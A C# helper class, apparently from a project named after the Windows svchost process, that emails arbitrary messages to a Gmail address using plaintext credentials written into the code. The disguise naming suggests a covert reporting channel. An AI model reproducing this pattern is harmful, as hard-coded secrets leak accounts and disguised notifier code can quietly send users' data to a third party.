using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;

namespace svchost.Helper
{
    public class Email
    {
        /// <summary>
        /// 
        /// </summary>
        /// <param name="mensagem"></param>
        public static void Notificar(string mensagem)
        {

            MailMessage mail = new MailMessage();

            //define os endereços
            mail.From = new MailAddress("exezueira@gmail.com");
            mail.Sender = new MailAddress("exezueira@gmail.com");
            mail.To.Add("exezueira@gmail.com");

            //define o conteúdo
            mail.Subject = "Exe notification";
            mail.Body = mensagem;

            //envia a mensagem
            SmtpClient smtp = new SmtpClient();
            smtp.Host = "smtp.gmail.com";
            smtp.EnableSsl = true;
            smtp.Port = 587;
            smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
            smtp.Credentials = new NetworkCredential("exezueira@gmail.com", "exetozueira_123");
            smtp.Send(mail);
        }
    }
}
